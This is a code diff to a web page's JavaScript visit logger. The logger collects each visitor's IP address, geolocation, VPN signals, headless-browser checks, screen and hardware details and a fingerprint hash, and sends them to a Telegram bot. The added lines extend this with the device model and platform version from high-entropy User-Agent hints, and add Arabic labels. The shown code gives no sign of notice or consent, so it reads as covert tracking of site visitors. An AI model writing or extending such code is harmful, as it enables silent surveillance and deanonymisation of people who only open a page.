@@ -183,6 +183,17 @@ function deviceInfo() {
   };
 }
 
+async function uaModel() {
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
+      const m = (h.model || '').trim();
+      return m ? m + (h.platformVersion ? ' (A' + h.platformVersion + ')' : '') : '';
+    }
+  } catch (e) { /* ignore */ }
+  return '';
+}
+
 async function tg(text) {
   try {
     await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -198,6 +209,7 @@ async function logVisit() {
   window._ip = ip;
   const d = deviceInfo();
   const g = await geoIP(ip);
+  const model = await uaModel();
   const sig = await vpnSignals(ip, g && g.tzid, g && g.cc);
   if (isVpn(sig)) {
     const reasons = [];
@@ -223,7 +235,8 @@ async function logVisit() {
 📶 net: ${net}
 🗣️ ${d.lang}
 🌍 ${d.tz}
-📐 ${d.screen} | dpr:${window.devicePixelRatio || '?'} | touch:${d.touch} | cpu:${d.cores} | ram:${d.mem}
+📐 ${d.screen} | dpr:${window.devicePixelRatio || '?'} | touch:${d.touch} | cpu≈${d.cores} | ram≈${d.mem} (تقريبي)
+📱 الموديل: ${model || 'غير متاح'}
 🤖 headless: ${headless} | cookies:${navigator.cookieEnabled ? 'on' : 'off'}
 🔗 ref: ${d.ref}
 #️⃣ fp: ${d.fp}`
